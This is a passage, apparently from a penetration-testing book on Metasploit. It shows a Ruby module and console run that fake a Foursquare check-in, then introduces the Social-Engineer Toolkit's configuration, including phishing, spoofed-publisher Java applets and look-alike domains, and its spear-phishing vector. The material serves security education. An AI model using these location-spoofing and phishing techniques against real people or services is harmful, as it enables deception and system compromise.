=&gt; postrequest, &#39;headers&#39; =&gt;</p><p class="s25" style="padding-left: 175pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 192pt;text-indent: 0pt;text-align: left;">&#39;Authorization&#39; =&gt; &quot;Basic #{user_pass}&quot;, &#39;Proxy-Connection&#39; =&gt; &quot;Keep-Alive&quot;,</p><p class="s25" style="padding-left: 175pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s25" style="padding-bottom: 3pt;padding-left: 141pt;text-indent: 0pt;line-height: 11pt;text-align: left;">}, 25)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_378.png"/></span></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">Now we reach the actual logic of the script—what happens when <span class="s25">run </span>is called within the module. Initially the provided options are set to local vari- able names <span class="s32">O </span>along with defining various other objects. An object is then</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">created by calling the <span class="s19">send_request_cgi </span>method <span class="s32">8 </span>imported into the script</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">from <span class="s19">lib/msf/core/exploit/http.rb </span>and defined as “Connects to the server, cre-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">ates a request, sends the request, reads the response.” This method takes var- ious parameters that make up the call to the actual server, as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_379.png"/></span></p><p class="s30" style="padding-left: 79pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O<span class="s25">print_status(&quot;#{res}&quot;) #this outputs the entire response. We could probably do</span></p><p class="s25" style="padding-left: 185pt;text-indent: 0pt;line-height: 9pt;text-align: left;">#without this but it&#39;s nice to see what&#39;s going on.</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 70pt;text-indent: -8pt;line-height: 80%;text-align: left;">8<span class="s25">rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout rescue ::Timeout::Error, ::Errno::EPIPE =&gt;e</span></p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;text-align: left;">puts e.message</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 10pt;text-align: left;">end</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_380.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 17pt;line-height: 74%;text-align: left;">After this object is created, the results are printed <span class="s32">O</span>. If anything goes wrong, logic exists for catching any errors <span class="s32">8 </span>and reporting them to the user. All of this logic is simple and is just a matter of plugging various parameters</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">into existing functions of the Framework. This is a great example of the power of the Framework, because it allows us to concentrate only on the information needed to address our goal. There is no reason to reproduce any of the standard functions such as error handling, connection manage- ment, and so on.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Let’s see this module in action. If you don’t remember the full path to the module within the Metasploit directory structure, search for it like so.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_381.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">msf &gt; </span><span class="s24">search foursquare</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Searching loaded modules for pattern &#39;foursquare&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Auxiliary</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:100.72pt" cellspacing="0"><tr style="height:10pt"><td style="width:75pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:117pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:75pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:117pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:10pt"><td style="width:75pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">admin/foursquare</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:117pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Foursquare Location Poster</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8 <span class="s25">msf &gt; use admin/foursquare</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">@ <span class="s25">msf auxiliary(foursquare) &gt; info</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 107pt;text-indent: 12pt;text-align: left;">Name: Foursquare Location Poster Version: $Revision:$</p><p class="s25" style="padding-left: 120pt;text-indent: -12pt;text-align: left;">License: Metasploit Framework License (BSD) Rank: Normal</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Provided by:</p><table style="border-collapse:collapse" cellspacing="0"><tr style="height:16pt"><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:85pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:43pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD</p></td><td style="width:85pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">password</p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">foursquare password</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Proxies</p></td><td style="width:85pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Use a proxy chain</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:85pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">api.foursquare.com</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:85pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">80</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">USERNAME</p></td><td style="width:85pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">username</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">foursquare username</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">VENUEID</p></td><td style="width:85pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">185675</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">foursquare venueid</p></td></tr><tr style="height:10pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">VHOST</p></td><td style="width:85pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:104pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">HTTP server virtual host</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"/><p class="s25" style="padding-left: 90pt;text-indent: 8pt;line-height: 193%;text-align: left;"><a href="mailto:cg@carnal0wnage.com" class="s34" target="_blank">CG </a>&lt;cg@carnal0wnage.com&gt; Basic options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description:</p><p class="s25" style="padding-left: 98pt;text-indent: 0pt;line-height: 11pt;text-align: left;">F*ck with Foursquare, be anywhere you want to be by venue id</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-bottom: 3pt;padding-left: 98pt;text-indent: -8pt;text-align: left;"><a href="http://groups.google.com/group/foursquare-api" class="s34" target="_blank">References: </a><a href="http://www.mikekey.com/im-a-foursquare-cheater/" class="s34" target="_blank">http://groups.google.com/group/foursquare-api http://www.mikekey.com/im-a-foursquare-cheater/</a></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_382.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">In the prior example, we search for “foursquare” <span class="s32">O</span>, issue the <span class="s25">use </span>com- mand <span class="s32">8 </span>to select the auxiliary module, and display the information <span class="s32">@ </span>for the selected module. Based on the options presented above, we need to con-</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">figure a few of them first.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_383.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">msf auxiliary(foursquare) &gt; </span><span class="s24">set VENUEID 2584421</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">VENUEID =&gt; 2584421</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(foursquare) &gt; <a href="mailto:msf@elwood.net" class="s40" target="_blank">set USERNAME msf@elwood.net</a></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">USERNAME =&gt; metasploit</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(foursquare) &gt; <span class="s24">set  PASSWORD  ilovemetasploit</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD =&gt; ilovemetasploit</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">msf auxiliary(foursquare) &gt; </span><span class="s24">run</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Base64 Encoded User/Pass: bXNmQGVsd29vZC5uZXQ6aWxvdmVtZXRhc3Bsb2l0</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Base64 Decoded User/Pass: msf@elwood.net:ilovemetasploit [*] HTTP/1.1 200 OK</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Content-Type: text/xml; charset=utf-8 Date: Sat, 08 May 2010 07:42:09 GMT</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Content-Length: 1400 Server: nginx/0.7.64 Connection: keep-alive</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: left;">&lt;checkin&gt;&lt;id&gt;40299544&lt;/id&gt;&lt;created&gt;Sat, 08 May 10 07:42:09 +0000&lt;/created&gt;&lt;message&gt;OK! We&#39;ve got you @ Washington DC Union Station. This is your 1st checkin here!&lt;/message&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 88%;text-align: left;">&lt;venue&gt;&lt;id&gt;2584421&lt;/id&gt;&lt;name&gt;Washington DC Union Station&lt;/name&gt;&lt;primarycategory&gt;&lt;id&gt;79283&lt;/ id&gt;&lt;fullpathname&gt;Travel:Train Station&lt;/fullpathname&gt;&lt;nodename&gt;Train Station&lt;/nodename&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: left;"><a href="http://foursquare.com/img/categories/travel/trainstation.png" class="s34" target="_blank">&lt;iconurl</a>&gt;http://foursquare.com/img/categories/travel/trainstation.png&lt;/iconurl&gt;&lt;/primary category&gt;&lt;address&gt;Union Station&lt;/address&gt;&lt;city&gt;Washington&lt;/city&gt;&lt;state&gt;DC&lt;/state&gt;&lt;geolat&gt; 38.89777986957695&lt;/geolat&gt;&lt;geolong&gt;-77.0060920715332&lt;/geolong&gt;&lt;/venue&gt;&lt;mayor&gt;&lt;type&gt;nochange</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: left;">&lt;/type&gt;&lt;checkins&gt;4&lt;/checkins&gt;&lt;user&gt;&lt;id&gt;685446&lt;/id&gt;&lt;firstname&gt;Ron&lt;/firstname&gt;&lt;photo&gt;http:// playfoursquare.s3.amazonaws.com/userpix_thumbs/ELOW44QHXJFB4PWZ.jpg&lt;/photo&gt;&lt;gender&gt;male&lt;/ gender&gt;&lt;/user&gt;&lt;message&gt;Ron is The Mayor of Washington DC Union Station.&lt;/message&gt;&lt;/mayor&gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;"><a href="http://foursquare.com/img/badge/newbie" class="s34" target="_blank">&lt;badges&gt;&lt;badge&gt;&lt;id&gt;1&lt;/id&gt;&lt;name&gt;Newbie&lt;/name&gt;&lt;icon&gt;http://foursquare.com/img/badge/newbie</a></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">.png&lt;/icon&gt;&lt;description&gt;Congrats on your first check-in!&lt;/description&gt;&lt;/badge&gt;&lt;/badges&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;"><a href="http://foursquare.com/img/scoring/2.png" class="s34" target="_blank">&lt;scoring&gt;&lt;score&gt;&lt;points&gt;1&lt;/points&gt;&lt;ic</a>on&gt;http://foursquare.com/img/scoring/2.png&lt;/icon&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 79%;text-align: left;">&lt;message&gt;First stop tonight<span class="s30">@</span>&lt;/message&gt;&lt;/score&gt;&lt;score&gt;&lt;points&gt;5&lt;/points&gt;&lt;icon&gt;http:// foursquare.com/img/scoring/1.png&lt;/icon&gt;&lt;message&gt;First time @ Washington DC Union Station!&lt;/ message&gt;&lt;/score&gt;&lt;/scoring&gt;&lt;/checkin&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_384.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">In order to run this module successfully, we need a valid set of Four- square credentials to do the check-in. We first define the VenueID that we find online with a bit of Googling <span class="s32">O</span>, and then we set our Foursquare creden-</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">tials <span class="s32">8 </span>and run the module. We get a successful result with the Foursquare</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 13pt;text-align: left;">service confirming our check-in and giving us five points <span class="s32">@</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">In this case, we have submitted a request to “check in” at Union Station</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">in Washington, DC, on the Foursquare service (see Figure 9-1).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="287" height="64" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_385.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 9-1: A successful check-in at Union Station</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When we check the Foursquare website, we see a successful result. Mod- ules like these demonstrate that Metasploit allows us to implement nearly anything we can programmatically imagine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark287">Going Forward</a><a name="bookmark292">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">As you have seen, auxiliary modules can have a wide range of uses. The infra- structure provided by the Metasploit Framework can produce a wide array</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">of tools in a very short time. Using Metasploit’s auxiliary modules, you can scan an IP address range to determine which hosts are alive and which ser- vices are running on each host. You can then leverage this information to determine vulnerable services, such as in the WebDAV example, or even log in via brute force on a remote server.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Although you can easily create custom auxiliary modules, don’t discount the existing auxiliary modules in the Framework. These modules may be the exact one-off tool you need.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The auxiliary modules provide a wide range of potential additional ave- nues. For a web application, the auxiliary modules offer more than 40 addi- tional checks or attacks that you can perform. In some instances, you may want to brute force a web server to see which servers are listing directories. Or you may want to scan the web server to see if it can act as an open proxy and relay traffic out to the Internet. Regardless of your needs, the auxiliary modules can provide additional enumeration information, attack vectors, or vulnerabilities.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="134" height="125" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_386.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 9pt;padding-left: 212pt;text-indent: -74pt;line-height: 87%;text-align: left;"><a name="bookmark293">THE SOCIAL-ENGINEER TOOLKIT </a><a name="bookmark308">&zwnj;</a><a name="bookmark309">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The Social-Engineer Toolkit (SET) was developed to coincide with the release of Social-Engineer.org, a set of resources conceived by Chris Hadnagy (loganWHD) and written by one of this book’s authors, David Kennedy. The site offers a centralized location for social-engineering tutorials and explains terminologies, definitions, and scenarios that can help prepare you for hacking the human mind.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The purpose of SET is to fill a gap in the penetration testing community and bring awareness to social-engineering attacks. And it has succeeded— SET has been downloaded 1 million times and is now an industry standard for deploying social-engineering attacks. The toolkit attacks human weaknesses, exploiting curiosity, credibility, avarice, and simple human stupidity. Social- engineering attacks are at an all-time high and have always been a large risk for many organizations.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Of course, social engineering is nothing new. One person trying to coax another to perform acts that he normally wouldn’t do is as old as time itself. Many in the security community believe that social engineering is one of the biggest risks organizations face, because it’s extremely difficult to protect organizations from being attacked in this way. (You might remember the ultrasophisticated Operation Aurora attack, for example, in which social- engineering was used to attack Gmail and other sources of Google data.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">An <span class="s19">attack vector </span>is the avenue used to gain information or access to a sys- tem. SET categorizes attacks by attack vector (such as web, email, and USB- based attacks). It uses email, spoofed websites, and other vectors to reach human targets, typically tricking individuals into compromising the target or releasing sensitive information. Naturally, each vector can have a different success rate depending on its target and the communication used. SET also comes prebuilt with email and website templates that can be used for social- engineering attacks. SET heavily uses the Metasploit Framework.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Because of the social nature of the attacks themselves, each example in this chapter is coupled with a brief story.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark294">Configuring the Social-Engineer Toolkit</a><a name="bookmark310">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">By default, in Back|Track, SET is located in the <span class="s19">/pentest/exploits/set/ </span>directory. Before you begin, make sure that you are running the latest version of SET.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_387.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/pentest/exploits/set# <span class="s24">svn update</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_388.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, configure your SET configuration file according to what you’re attempting to accomplish. We’ll cover a couple of simple features within the configuration file <span class="s19">config/set_config </span>within the root SET directory.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When using the SET web-based attack vectors, you can turn <span class="s25">ON </span>the <span class="s25">WEBATTACK_EMAIL </span>flag to perform email phishing in conjunction with the web attack. This flag is turned <span class="s25">OFF </span>by default, which means that you will configure SET and use the web attack vector without the support of email phishing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_389.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">METASPLOIT_PATH=/opt/framework3/msf3</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">WEBATTACK_EMAIL=ON</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_390.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">One of the web-based attacks available in SET is the <span class="s19">Java applet attack</span>, which uses self-signed Java applets. By default, this attack uses <span class="s19">Microsoft </span>as the publisher name; however, if the Java Development Kit (JDK) has been installed, you can turn this option <span class="s25">ON </span>and sign the applet with whatever name you want. When you turn this flag <span class="s25">ON</span>, additional options will be available through the interface.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_391.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">SELF_SIGNED_APPLET=ON</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_392.png"/></span></p><p style="padding-top: 7pt;text-indent: 0pt;text-align: right;">The <span class="s25">AUTO_DETECT </span>setting is one of the most important flags and is turned</p><p class="s25" style="text-indent: 0pt;text-align: right;">ON <span class="p">by default. It tells SET to detect your local IP address automatically and to</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">use that as the address for the reverse connection and web servers. If you are using multiple interfaces or your reverse payload listener is housed at a dif- ferent location, turn this flag <span class="s25">OFF</span>. When this option is <span class="s25">OFF</span>, SET will allow you to specify multiple scenarios to ensure that the proper IP address scheme is used, for example, in a scenario that includes NAT and port forwarding.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">These options are reflected within the SET interface.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_393.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">AUTO_DETECT=OFF</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_394.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When you use the toolkit, by default it uses a built-in Python web-based server. To optimize performance, set the <span class="s25">APACHE_SERVER </span>flag to <span class="s25">ON</span>, and SET will use Apache for the attacks.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_395.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">APACHE_SERVER=ON</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_396.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Those are the basics of the configuration file. As you can see, you can significantly change SET’s behavior depending on which flags are set in the tool. Now let’s run the tool.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark295">Spear-Phishing Attack Vector</a><a name="bookmark311">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">spear-phishing attack vector </span>specially crafts file-format exploits (such as Adobe PDF exploits) and primarily sends email attacks containing attach- ments to a target, which, when opened, compromise the target’s machine. SET can use Simple Mail Transport Protocol (SMTP) open relays (both anonymous and credentialed), Gmail, and Sendmail to send email. SET can also use standard email or HTML-based email to perform the phishing attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s consider a real-world penetration test targeting the company CompanyXYZ. You register a domain name similar to Company XYZ, say <span class="s19">coompanyxyz.com</span>. You then register the subdomain <span class="s19">coom.panyXYZ.com</span>. Next, you send a spear-phishing attack to the target organization, knowing that most employees only glance at email and will open any attachment that appears to be legitimate. In this 